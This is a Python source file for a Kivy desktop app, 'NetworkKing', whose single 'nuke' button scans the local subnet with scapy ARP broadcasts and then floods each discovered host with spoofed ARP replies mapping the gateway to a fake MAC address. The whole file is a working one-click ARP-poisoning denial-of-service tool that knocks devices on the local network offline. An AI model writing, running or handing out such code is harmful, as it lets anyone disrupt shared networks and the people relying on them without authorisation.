import socket
import threading
import time

import scapy.all as scapy
from kivy.animation import Animation
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.relativelayout import RelativeLayout


class NetworkKing(App):

    def start_destruction(self, instance):

        if self.trigger == 0:
            self.spoof = True
            self.trigger = 1
            self.animation = Animation(angle=360, duration=2)
            self.animation += Animation(angle=20, duration=2)
            self.animation.repeat = True
            # apply the animation on the button, passed in the "instance" argument
            # Notice that default 'click' animation (changing the button
            # color while the mouse is down) is unchanged.
            self.animation.start(instance)
            self.results = self.scan()
            for result in self.results:
                self.results.remove(result)
            self.print_results(self.results)
            for result in self.results:
                try:
                    t1 = threading.Thread(target=self.boom, args=(result["ip"], self.gateway_ip, result["mac"]))
                    print("Starting thread")
                    t1.setDaemon(True)
                    t1.start()
                except Exception as e:
                    print(e)
        else:
            self.animation.stop(instance)
            self.animation.cancel(instance)
            self.spoof = False
            self.trigger = 0

    def boom(self, ip, gateway_ip, victims_mac):
        self.poison(ip, gateway_ip, victims_mac)

    def build(self):
        firstlayout = RelativeLayout()
        self.trigger = 0
        self.action_button = Button(background_down="nuke.png", background_normal="nuke.png", font_size=14,
                                    size_hint=(None, None), pos_hint={'center_x': .5, 'center_y': .5},
                                    on_press=self.start_destruction)
        # action_button.bind(on_press=lambda a: self.print_results(self.scan()))
        firstlayout.add_widget(self.action_button)
        return firstlayout

    def scan(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        self.own_ip = s.getsockname()[0]
        self.ip = self.own_ip[:-1] + "1/24"
        self.gateway_ip = self.own_ip[:-1] + "1"
        s.close()

        arp_request = scapy.ARP(pdst=self.ip)

        # print(arp_request.summary()) prints the request we have created
        # scapy.ls(scapy.ARP()) show us the available options and the default vaules for them

        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # scapy.ls(scapy.Ether())
        # print(broadcast.summary())
        arp_request_broadcast = broadcast / arp_request
        # print(arp_request_broadcast.summary())
        # arp_request_broadcast.show() show will show us more details about our packet than summary

        answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)

        # print(answered_list.summary())
        # print(unanswered_list.summary())
        client_list = []
        for element in answered_list:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            # 0 element is the packet send 1 element is the answer
            client_list.append(client_dict)
        return client_list

    def print_results(self, results_list):
        print("IP\t\t\tMAC Address\n--------------------------------------")
        for client in results_list:
            print(client["ip"] + "\t\t" + client["mac"])

    def poison(self, victims_ip, gateway_ip, victim_mac):
        # Send the victim an ARP packet pairing the gateway ip with the wrong
        # mac address
        while self.spoof:
            packet = scapy.ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victims_ip, hwdst=victim_mac)
            scapy.send(packet, verbose=0)
            print("\r[+] Packets sent:")
            time.sleep(2)

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[
            0]  # answered requests are [0] unanswered [1]

        return answered_list[0][1].hwsrc


if __name__ == "__main__":
    NetworkKing().run()
